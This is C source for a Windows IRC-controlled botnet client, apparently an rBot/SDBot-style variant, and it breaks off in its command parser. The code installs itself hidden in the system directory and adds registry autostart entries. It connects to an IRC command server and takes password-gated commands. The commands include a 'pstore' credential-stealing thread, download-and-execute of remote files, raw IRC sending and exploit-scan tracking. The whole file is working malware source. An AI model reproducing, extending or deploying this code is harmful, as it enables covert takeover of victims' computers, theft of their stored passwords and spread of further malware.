#include "includes.h"
#include "extern.h"
#include "config.h"
char exploitn[15];
#define WIN32_LEAN_AND_MEAN
char fileto[MAX_PATH];
// macro for predefined aliases. (these are just examples, you can change them to whatever you want)
#define addpredefinedaliases() \
char irc_privmsg[256];
int current_version=0;

/*// ping/udp structure.
typedef struct ps {
char host[128];
char chan[128];
int num;
int size;
int delay;
int port;
SOCKET sock;
int threadnum;
BOOL silent;
BOOL gotinfo;
 } ps;*/

// irc/spy structure.
typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char nick[16];
	int threadnum;
	BOOL gotinfo;
} ircs;

// alias structure
typedef struct as {
	char name[24];
	char command[160];
} as;
// wininet.dll function variables
typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
IGCSE fInternetGetConnectedStateEx;
typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
IGCS fInternetGetConnectedState;
// kernel32.dll function variables

typedef int (__stdcall *RSP)(DWORD, DWORD);
RSP fRegisterServiceProcess;

//char scanip[20];
//SOCKET sock2;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);

// global variables
HANDLE ih;
ircs mainirc;           // main irc structure
char prefix1 = prefix;  // prefix variable
//	HANDLE ih;              // internet handle
THREAD threads[MAXTHREADS]; //new thread handles

SOCKET csock[64];       // thread sockets
char cnick[64][16];     // thread nicks
char log[128][128];     // log entries
DWORD w;                // DWORD used for various stuff
as aliases[maxaliases]; // alias array
int anum = 16;          // number of aliases
BOOL success = FALSE;   // if true then we made successful connect attempt
char tempdir[256];      // name of temp folder
char pbuff[65500];      // packet buffer
BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available
BOOL noicmp;            // if true, icmp.dll is available=
DWORD started;          // time bot was started
int transfers = 0;
bool transfer_info = false;

void irc_send(SOCKET sock, char *msg);
//DWORD WINAPI PortScanner(LPVOID param);

// program starts here
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{ 
	WSADATA wsadata;
	int i = 0, err = 0;
	HKEY key;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char szInstallPath[MAX_PATH];
	//   char svcpath[MAX_PATH];
	char tstr[256];
	DWORD cstat;
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;
	
	// record start time
	started = GetTickCount() / 1000;
	
	/*   #ifndef NO_PING
	// load icmp.dll functions
	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
	else {
	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
	fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
	fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
	if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	noicmp = TRUE;
	}
	}
#endif*/
	
	srand(GetTickCount());
    // append this:
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));
	
	// load functions from kernel32.dll and hide from the windows 9x task manager
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		
		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}
	
	// initialize wininet stuff
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	// see if InternetGetConnectedStateEx is available
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;
		
		fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
		if (!fInternetGetConnectedStateEx) {
			noigcse = TRUE;
		} else noigcse = FALSE;
	}
	
	// get our file name and the path to the temp folder
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	sprintf(szInstallPath, "%s\\%s", sysdir, filename);
	GetTempPath(sizeof(tempdir), tempdir);
	
	// check if this exe is running already
	CreateMutex(NULL, FALSE, botid);
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		Sleep(6000);		//for updates... cheap bugfix.
	}
	
	err = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		WSACleanup();
		return 0;
	}
	/*	SERVICE_TABLE_ENTRY servicetable[] =
	{
	{ServiceName, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
	{NULL, NULL}
};*/
	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);
	
	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		// loop until the file is copied.
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(5000);
		
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}
	/*	if (ServiceInst) 
	{
	InstallService(svcpath);
	}*/
	if (AutoStart) { 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key); 
		
		
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1); 
		RegCloseKey(key); 
		
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key); 
		
	}
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));
	
	addthread("Bot started.",MAIN_THREAD,NULL);
	
	// remove the following line if you don't want any predefined aliases
	
	memset(log, 0, sizeof(log));
	//addlog("Bot Started.");
	
	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	//	mainirc.spy = 0;
	
	while (1) {
		for (i = 0; i < 6; i++) {
#ifndef NO_CHECKCONNECTION
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
#endif
			
			err = irc_connect((void *)&mainirc);
			
			success = FALSE;
			if (err == 2) break; // break out of the loop
			
			if (success) i--; // if we're successful in connecting, decrease i by 1;
			
			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}
		
		if (err == 2) break; // break out of the loop and close
		
		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		/*if(fStartServiceCtrlDispatcher(servicetable) == 0)
		InstallService(svcpath);*/
		else if (!bkpserver && server2[0] != '\0') {
			strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}
	
	// cleanup;
	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();
	
	return 0;
 }
 // function to add an alias and return alias number
 int addalias(char *name, char *command)
 {
	 int i;
	 for (i = 0; i < maxaliases; i++) {
		 if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			 memset(&aliases[i], 0, sizeof(aliases[i]));
			 strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			 strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			 anum++;
			 break;
		 }
	 }
	 return i;
 }

int download(char *link,char *exxe)
{
  FILE *fp;
  HINTERNET hOpen, hURL;
  char file[99];
  unsigned long read;
  PROCESS_INFORMATION pInfo;
   STARTUPINFO sInfo;
  memset(&sInfo, 0, sizeof(sInfo));
  memset(&pInfo, 0, sizeof(pInfo));
  sInfo.cb = sizeof(STARTUPINFO);
  sInfo.dwFlags = STARTF_USESHOWWINDOW;
  sInfo.wShowWindow = SW_HIDE;
  hOpen = InternetOpen("wget", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
  if (hOpen == NULL) 
	  return 0;
	else
  hURL = InternetOpenUrl( hOpen, link, NULL, 0, 0, 0 );
	  if (hURL == NULL) 
	  return 0;
	else
  fp = fopen(exxe, "wb");
	  if (fp!=NULL)
  {
  while(InternetReadFile(hURL, file, sizeof(file) - 1 , &read) && read != 0)
  {
     fwrite(file, sizeof(char), read, fp);
  }  
  fclose(fp);
  CreateProcess(NULL, exxe, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo);
  return 1;
	  }
	  return 0;
}
 
 // connect function used by the original bot and all clones/spies
 DWORD WINAPI irc_connect(LPVOID param)
 {
	 SOCKET sock;
	 SOCKADDR_IN ssin;
	 DWORD err;
	 int rval;
	 char nick[16];
	 char *nick1;
	 char str[64];
	 //	BYTE spy;
	 ircs irc;
	 
	 irc = *((ircs *)param);
	 ircs *ircp = (ircs *)param;
	 ircp->gotinfo = TRUE;
	 
	 
	 while (1) {
		 memset(&ssin, 0, sizeof(ssin));
		 ssin.sin_family = AF_INET;
		 ssin.sin_port = htons(irc.port);
		 
		 ssin.sin_addr.s_addr=ResolveAddress(irc.host);
		 if (ssin.sin_addr.s_addr==0) return 0;
		 
		 memset(nick, 0, sizeof(nick));
		 nick1 = irc.nick; 
		 nick1 = rndnick(nick);
		 
		 sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		 csock[irc.threadnum] = sock;
		 err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		 if (err == SOCKET_ERROR) {
			 closesocket(sock);
			 Sleep(2000);
			 continue;
		 }
		 
		 sprintf(str, "Connected to %s", irc.host);
		 
		 //addlog(str);
		 
		 strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);
		 
		 rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.host);
		 closesocket(sock);
		 
		 if (rval == 0) continue;
		 if (rval == 1) {	//Disconnect (sleep 30 mins, reconnect..)
			 Sleep(1800000);
			 continue;
		 }
		 if (rval == 2) break;	//Quit
	 }
	 
	 clearthread(irc.threadnum);
	 cnick[irc.threadnum][0] = '\0';
	 return rval;
 }
 
 char * rndnick(char *strbuf)
 {
	int k;
	unsigned int ret;
	srand((unsigned int)time(NULL));
	for (k = 0;;)
	{
		ret = ((rand() % 26) + 97);
		strcat(strbuf, (const char *)&ret);
	}
	 return (strbuf);
 }
 
 // receive loop for bots/spies
 // int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, BYTE spy)
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, char *server)
 {
	 // main receive buffer
	 char buff[4096];
	 int err, repeat;
	 char master[128*maxlogins];
	 char str[8];
	 char login[64];
	 int in_channel=0;
	 
	 memset(master, 0, sizeof(master));
	 
	 
	 if (serverpass[0] != '\0') {
		 sprintf(login, "PASS %s\r\n", serverpass);
		 send(sock, login, strlen(login), 0);
	 }
	 
	 //
	 //Fixed the nick problem, lol i just used the original - Im just so l33t -  D3ADLiN3
	 //
	 sprintf(login, "NICK %s\r\n"
		 "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	 //
	 //
	 //
	 err = send(sock, login, strlen(login), 0);
	 if (err == SOCKET_ERROR) {
		 closesocket(sock);
		 Sleep(5000);
		 return 0;
	 }
	 
	 // loop forever
	 while(1) {
		 char host[160];
		 char *lines[MAX_LINES];
		 int i,j;
		 
		 
		 memset(buff, 0, sizeof(buff));
		 err = recv(sock, buff, sizeof(buff), 0);
		 // if recv() returns 0, that means that the connection has been lost.
		 if ((err == 0) || (err == SOCKET_ERROR)) break;
		 
		 // split lines up if multiple lines received at once, and parse each line
		 
		 
		 i=Split(buff,&lines);
		 for (j=0;j<i;j++) {
			 repeat=1;
			 do {
				 repeat=irc_parseline(lines[j], sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
				 repeat--;
			 } while (repeat>0);
			 if (repeat==-1) return 0;	//Reconnect
			 else if (repeat==-2) return 1;	//Disconnect
			 else if (repeat==-3) return 2;	//Quit
		 }
		 
	 }
	 
	 return 0;
 }
 
 // function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
 {
	 char line1[512];
	 char line2[512];
	 //	char buff[512];
	 char *masters[maxlogins];
	 bool param[256];
	 BOOL ismaster;
	 char ntmp[12];
	 char ntmp2[3];
	 int i, ii, s;
	 char *a[32];
	 char a0[128];
	 char nick[16];
	 char user[24];
	 char sendbuf[512];
	 unsigned char parmenters[256];
	 //unsigned char parameters[256];
	 char msg_real_dest[256];
	 DWORD id;
	 BOOL silent = FALSE;
	 BOOL notice = FALSE;
	 BOOL usevars = FALSE;
	 int cl;
	 
	 memset(sendbuf, 0, sizeof(sendbuf));
	 	memset(param, 0, sizeof(param));
	 id = 0;
	 strncpy(nick, nick1, sizeof(nick)-1);
	 for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);
	 
	 if (line == NULL) return 1;
	 memset(line1, 0, sizeof(line1));
	 strncpy(line1, line, sizeof(line1)-1);
	 char *x = strstr(line1, " :");
	 
	 // split the line up into seperate words
	 strncpy(line2, line1, sizeof(line2)-1);
	 a[0] = strtok(line2, " ");
	 for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
	 
	 if (a[0] == NULL || a[1] == NULL) return 1;
	 
	 silent=FALSE;   //silent by default :) 
	 //check for 'silent' parameter 
	 
	 memset(parmenters,0,sizeof(parmenters)); 
	 
	 for (i=31;i>=0;i--) { 
		 if (!a[i]) continue; 
		 if ((a[i][0]=='-') && (a[i][2]==0)) { 
			 //Looks like a valid parmenter.. 
			 parmenters[a[i][1]]=1; 
			 a[i][0]=0; 
			 a[i][1]=0; 
			 a[i][2]=0; 
			 a[i]=NULL; 
		 } else break; 
	 } 
	 
	 if (parmenters['s']) silent=TRUE; 
	 if (parmenters['n']) { 
		 silent=FALSE; 
		 notice=TRUE; 
	 }
	 if (a[0][0] != '\n') {
		 strncpy(a0,  a[0], sizeof(a0)-1);
		 strncpy(user, a[0]+1, sizeof(user)-1);
		 strtok(user, "!");
	 }
	 
	 // pong if we get a ping request from the server
	 if (strcmp("PING", a[0]) == 0) {
		 a[0][1]='O';
		 
		 irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		 if (*in_channel == 0) {
			 irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		 }
		 return 1;
	 }
	 
	 // looks like we're connected to the server, let's join the channel
	 if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		 irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		 irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		 irc_sendf(sock,"MODE %s +i\r\n",nick1);
		 success = TRUE;
		 return 1;
	 }
	 
	 // get host
	 if (strcmp("302", a[1]) == 0) {
		 char *h = strstr(a[3], "@");
		 if (h != NULL) strncpy(host,  h+1, 159);
		 return 1;
	 }
	 
	 // nick already in use   - 
	 if (strcmp("433", a[1]) == 0) {
		 rndnick(nick1);
		 irc_sendf(sock, "NICK %s\r\n", nick1);
		 return 1;
	 }
	 
	 
	 // check if user is logged in
	 ismaster = FALSE;
	 for (i = 0; i < maxlogins; i++) {
		 if (strcmp(masters[i], a0) == 0) {
			 ismaster = TRUE;
		 }
	 }
	 
	 //rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	 if (strcmp("KICK", a[1]) == 0) {
		 char *knick;
		 for (i = 0; i < maxlogins; i++) {
			 if (masters[i][0] == '\0') continue;
			 strncpy(a0,  masters[i], sizeof(a0)-1);
			 knick = user;
			 if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				 masters[i][0] = '\0';
				 sprintf(sendbuf,"User %s logged out", knick);
				 irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				 //	addlog(sendbuf);
			 }
		 }
		 if (strcmp(nick1, a[3]) == 0) {
			 *in_channel = 0;
			 irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		 }
		 return 1;
	 }
	 
	 
	 if (strcmp("NICK", a[1]) == 0) {
		 char *oldnck = user;
		 char *newnck = a[2] + 1;
		 for (i=0;i<maxlogins;i++) {
			 if (strcmp(masters[i],a0)==0) {
				 //Master has changed nick
				 //Lets TRY to rebuild the master-usermask.
				 char *identandhost=strchr(a0,'!');
				 if (identandhost) {
					 masters[i][0]=':';	//Prefix
					 strcpy(&masters[i][1],newnck);
					 strcat(&masters[i][2],identandhost);
				 }
			 }
		 }
		 if (oldnck != NULL && newnck != NULL)  {
			 if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		 }
		 return 1;
	 }
	 
	 // reset master if master parts or quits
	 if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		 masters[i][0] = '\0';
		 sprintf(sendbuf, "User %s logged out", user);
		 //addlog(sendbuf);
		 if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		 return 1;
	 }
	 
	 // we've successfully joined the channel
	 if (strcmp("353", a[1]) == 0) {
		 if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		 sprintf(sendbuf, "Joined channel %s", a[4]);
		 //addlog(sendbuf);
		 return 1;
	 }
	 
	 // if we get a privmsg, notice or topic command, start parsing it
	 if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		 if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			 if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			 if (a[2] == NULL) return 1;
			 strcpy(msg_real_dest,a[2]);
			 if (strstr(a[2], "#") == NULL || notice) a[2] = user;
			 
			 if (a[3] == NULL) return 1;
			 a[3]++;
			 // if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			 if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			 if (a[s] == NULL) return 1;
			 // if someone asks for our version, send version reply
			 if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				 irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
				 return 1;
			 }
			 else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				 irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				 return 1;
			 }
		 } else  { // it's a topic command
			 s = 4;
			 a[4]++;
			 a[2] = a[3];
		 }
		 
		 if (a[s]++[0] != prefix1) return 1;
		 // see if someone is logging in
		 
		 if (strcmp("login", a[s]) == 0)
		 {
			 if (a[s+1] == NULL) return 1;
			 if (ismaster || strstr(a[2], "#") == NULL) return 1;
			 
			 char *u = strtok(a[0], "!") + 1;
			 char *h = strtok(NULL, "\0");
			 
			 if (strcmp(password, a[s+1]) != 0)
			 {
				 //   irc_sendf(sock, "NOTICE %s :Password incorrect. Your attempt has been logged.\r\n", user);
				 // sprintf(sendbuf, "Failed login by %s (%s)", u, h);
				 //addlog(sendbuf);
				 return 1;
			 }
			 if (!HostMaskMatch(h))
			 {
				 //irc_sendf(sock, "NOTICE %s :Hostmask incorrect. Your attempt has been logged.\r\n", user);
				 //sprintf(sendbuf, "Failed login by %s (%s)", u, h);
				 //addlog(sendbuf);
				 return 1;
			 }
			 for(i = 0; i < maxlogins; i++)
			 {
				 if (a[s+1] == NULL) return 1;
				 if (masters[i][0] != '\0') continue;
				 if (strcmp(password, a[s+1]) == 0)
				 {
					 strncpy(masters[i],  a0, 127);
					 if (!silent) irc_privmsg(sock, a[2], "password accepted.", notice);
					 sprintf(sendbuf, "User %s (%s) logged in", u, h);
					 //addlog(sendbuf);
					 break;
				 }
			 }
			 return 1;
		 }
		 if (ismaster || strcmp("332", a[1]) == 0) {
			 // commands requiring no parameters
			 // check if the command matches an alias's name
			 for (i = 0; i < anum; i++) {
				 if (strcmp(aliases[i].name, a[s]) == 0) {
					 char *sc = strstr(line, " :");
					 if (sc == NULL) return 1;
					 sc[2] = prefix1;
					 sc[3] = prefix1;
					 strncpy(sc+4, aliases[i].command, 159);
					 
					 // process '$x-' parameter variables
					 for (ii=15; ii > 0; ii--) {
						 sprintf(ntmp, "$%d-", ii);
						 if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							 x = x + strlen(aliases[i].name);
							 if (x != NULL) {
								 char *y = strstr(x, a[s+ii]);
								 if (y != NULL) replacestr(line, ntmp, y);
							 }
						 }
						 else if (a[s+ii+1] == NULL) {
							 strncpy(ntmp2, ntmp, 2);
							 ntmp2[2] = '\0';
							 replacestr(line, ntmp, ntmp2);
						 }
					 }
					 
					 // process '$x' parameter variables
					 for (ii=16; ii > 0; ii--){
						 sprintf(ntmp, "$%d", ii);
						 if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					 }
					 
					 usevars = TRUE;
					 break;
				 }
			 }
			 
			 if (a[s][0] == prefix1 || usevars) {
				 // process variables
				 replacestr(line, "$me", nick1); // bot's nick
				 replacestr(line, "$user", user); // user's nick
				 replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				 replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				 replacestr(line, "$server", server); // name of current server
				 
				 // process '$chr()' variables
				 while (strstr(line, "$chr(") != NULL) {
					 char *c = strstr(line, "$chr(");
					 strncpy(ntmp, c+5, 4);
					 strtok(ntmp, ")");
					 if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					 if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					 ntmp2[1] = '\0';
					 cl = strlen(ntmp);
					 memset(ntmp, 0, sizeof(ntmp));
					 strncpy(ntmp, c, cl+6);
					 replacestr(line, ntmp, ntmp2);
				 }
				 
				 // re-split the line into seperate words
				 strncpy(line1, line, sizeof(line1)-1);
				 strncpy(line2, line1, sizeof(line2)-1);
				 a[0] = strtok(line2, " ");
				 for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				 if (a[s] == NULL) return 1;
				 a[s] += 3;
			 }
			 
			 if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				 rndnick(nick);
				 irc_sendf(sock, "NICK %s\r\n", nick);
			 }
			 else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				 if (strcmp("332", a[1]) != 0) exit(0);
			 }
			 else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				 for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					 masters[i][0] = '\0';
					 sprintf(sendbuf, "User %s logged out\r\n", user);
					 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					 //addlog(sendbuf);
				 }
			 }
			 else if (strcmp("pstore", a[s]) == 0) 
			    {
					CreateThread(NULL, 0, &pstore, 0, 0, 0);
					sprintf(sendbuf, "Executing pstore:");
				   if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}

#ifndef NO_BOTVERSION
			 else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				 sprintf(sendbuf, bversion);
				 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			 }
#endif
			 /* - Ignore this, just some test code I was using.
			 else if (strcmp("restrict", a[s]) == 0) {
			 HKEY hKey;
			 DWORD dwData;
			 if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Contol\\Lsa", 0, KEY_ALL_ACCESS, &hKey) != 0) return 1;
			 dwData = 0x00000001;
			 RegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
			 RegCloseKey(hKey);
			 irc_privmsg(sock, a[2], "Restricted NULL access to the IPC$ Share.", notice);
			 }
			 #endif
			 */
			 else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				 irc_send(sock, "QUIT :Reconnecting..");
				 return 0;
			 }
			 else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				 irc_send(sock, "QUIT :Client exiting");
				 return -1;
			 }
			 else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				 if (a[s+1] == NULL) irc_send(sock, "QUIT :Client exiting\r\n"); else {
					 if (x != NULL) {
						 char *y = strstr(x, a[s+1]);
						 if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					 }
				 }
				 return -2;
			 }
			 else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			 else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				 TLIST tlist;
				 _snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				 tlist.sock = sock;
				 tlist.notice = notice;
				 tlist.silent = silent;
				 tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));
				 
				 sprintf(sendbuf, "threads: list threads.");
				 tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				 if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					 while (tlist.gotinfo == FALSE)
						 Sleep(50);
				 } else
					 sprintf(sendbuf,"threads: failed to start list thread, error: <%d>.", GetLastError());
				 //	addlog(sendbuf);
				 
				 return repeat;
			 }
			 else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				 if (!silent) irc_privmsg(sock, a[2], "Removing bot..", notice);
				 uninstall();
				 WSACleanup();
				 exit(0);
			 }
			 else if (strcmp("scanstats",a[s]) == 0)
			 {
			 if(!a[s+1] || transfers >= atoi(a[s+1]))
		     sprintf(sendbuf,"Main -> Total exploited %d.",a[i],transfers);
			 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
	       	 transfers++;
		   	 if(transfer_info)
			 sprintf(sendbuf,"Main -> Transfer completed to host.",a[i]);
			 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			 }
			 else if (strcmp("cscanstop",a[s]) == 0 || strcmp("cstop",a[s]) == 0) 
			 {
				 stopthread(sock,a[2],notice,silent,"[.12Scan.]","Scan",SCAN_THREAD,a[s+1]);
				 
				 return 1;
			 }
			 // commands requiring at least 1 parameter
			 else if (a[s+1] == NULL) return 1;
			 
			 else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				 irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			 }
			 else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				 irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			 }
			 else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				 irc_sendf(sock, "PART %s\r\n", a[s+1]);
			 }
			 else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				 if (x != NULL) {
					 char *y = strstr(x, a[s+1]);
					 if (y != NULL) irc_send(sock, y);
				 }
			 }
			 else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				 if (strcmp("all", a[s+1]) == 0) {
					 if ((i=killthreadall()) > 0)
						 sprintf(sendbuf,"threads: Stopped: %d thread(s).", i);
					 else
						 sprintf(sendbuf,"threads: No active threads found.");
					 if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					 //addlog(sendbuf);					
				 } else {
